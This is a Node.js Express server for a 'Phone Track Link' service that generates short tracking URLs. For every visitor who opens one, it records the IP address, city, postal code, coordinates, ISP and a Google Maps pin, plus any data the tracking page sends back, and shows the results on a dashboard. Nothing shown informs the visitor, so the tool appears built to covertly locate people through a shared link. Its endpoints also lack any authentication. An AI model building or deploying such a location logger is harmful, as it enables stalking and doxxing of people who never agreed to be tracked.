const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;
const MONGODB_URI = process.env.MONGODB_URI;
const DATA_FILE = process.env.VERCEL
  ? path.join('/tmp', 'data.json')
  : path.join(__dirname, 'data.json');

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB with timeout options suitable for serverless
let connPromise = null;
let lastDbError = null;

async function connectDB() {
  if (!MONGODB_URI) {
    lastDbError = 'MONGODB_URI environment variable is missing';
    return false;
  }
  if (mongoose.connection.readyState === 1) return true;
  if (connPromise) return connPromise;

  connPromise = mongoose.connect(MONGODB_URI, {
    serverSelectionTimeoutMS: 5000,
    connectTimeoutMS: 5000,
  }).then(() => {
    console.log('Connected to MongoDB Atlas');
    lastDbError = null;
    return true;
  }).catch((err) => {
    console.error('MongoDB connection error:', err.message);
    lastDbError = err.message;
    connPromise = null;
    return false;
  });

  return connPromise;
}

app.get('/api/health', async (req, res) => {
  const connected = await connectDB();
  res.json({
    status: connected ? 'ok' : 'error',
    mongoConfigured: !!MONGODB_URI,
    mongoConnected: connected,
    dbError: lastDbError,
  });
});

// Define Mongoose Schema for Link
const linkSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  label: { type: String, default: 'Untitled link' },
  createdAt: { type: String, default: () => new Date().toISOString() },
  visits: { type: Array, default: [] }
});

const LinkModel = mongoose.models.Link || mongoose.model('Link', linkSchema);

// JSON fallback functions
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch {}
  return { links: {} };
}

function saveData(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('Save data error:', err);
  }
}

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const ip = forwarded.split(',')[0].trim();
    if (ip) return ip;
  }
  return req.headers['x-real-ip'] || req.socket.remoteAddress || 'Unknown';
}

async function fetchIpGeolocation(ip) {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return null;
  }
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (response.ok) {
      const data = await response.json();
      if (data.status === 'success') {
        return {
          country: data.country,
          countryCode: data.countryCode,
          region: data.regionName,
          city: data.city,
          zip: data.zip,
          lat: data.lat,
          lon: data.lon,
          timezone: data.timezone,
          isp: data.isp,
          org: data.org,
          as: data.as,
          ip: data.query,
          mapsUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
        };
      }
    }
  } catch (err) {
    console.error('IP Geolocation error:', err.message);
  }
  return null;
}

app.post('/api/links', async (req, res) => {
  const id = uuidv4().slice(0, 8);
  const label = req.body.label || 'Untitled link';

  const connected = await connectDB();

  if (connected) {
    try {
      const linkDoc = new LinkModel({
        id,
        label,
        createdAt: new Date().toISOString(),
        visits: []
      });
      await linkDoc.save();
      return res.json({ id, url: `/t/${id}` });
    } catch (err) {
      console.error('Failed to create link in MongoDB:', err);
    }
  }

  // Fallback to local JSON if MongoDB is not connected or fails
  const data = loadData();
  data.links[id] = {
    id,
    label,
    createdAt: new Date().toISOString(),
    visits: [],
  };
  saveData(data);
  res.json({ id, url: `/t/${id}` });
});

app.get('/api/links/:id', async (req, res) => {
  const { id } = req.params;
  const connected = await connectDB();

  if (connected) {
    try {
      const link = await LinkModel.findOne({ id }).lean();
      if (link) {
        return res.json(link);
      }
    } catch (err) {
      console.error('MongoDB query error:', err.message);
    }
  }

  // Fallback to local JSON
  const data = loadData();
  const link = data.links[id];
  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }
  res.json(link);
});

app.get('/api/links', async (req, res) => {
  const connected = await connectDB();

  if (connected) {
    try {
      const links = await LinkModel.find().lean();
      const formatted = links
        .map(({ id, label, createdAt, visits }) => ({
          id,
          label,
          createdAt,
          visitCount: visits ? visits.length : 0,
        }))
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      return res.json(formatted);
    } catch (err) {
      console.error('MongoDB query error:', err.message);
    }
  }

  // Fallback to local JSON
  const data = loadData();
  const links = Object.values(data.links)
    .map(({ id, label, createdAt, visits }) => ({
      id,
      label,
      createdAt,
      visitCount: visits ? visits.length : 0,
    }))
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  res.json(links);
});

app.post('/api/track/:id', async (req, res) => {
  const { id } = req.params;
  const clientIp = getClientIp(req);
  const ipGeo = await fetchIpGeolocation(clientIp);

  const visit = {
    id: uuidv4().slice(0, 8),
    timestamp: new Date().toISOString(),
    ip: clientIp,
    ipGeo,
    ...req.body,
  };

  const connected = await connectDB();

  if (connected) {
    try {
      const link = await LinkModel.findOne({ id });
      if (link) {
        link.visits.unshift(visit);
        await link.save();
        return res.json({ success: true });
      }
    } catch (err) {
      console.error('MongoDB save visit error:', err.message);
    }
  }

  // Fallback to local JSON
  const data = loadData();
  const link = data.links[id];
  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }

  link.visits.unshift(visit);
  saveData(data);
  res.json({ success: true });
});

app.get('/t/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/dashboard/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

if (require.main === module) {
  connectDB().then(() => {
    app.listen(PORT, () => {
      console.log(`Phone Track Link running at http://localhost:${PORT}`);
    });
  });
}

module.exports = app;
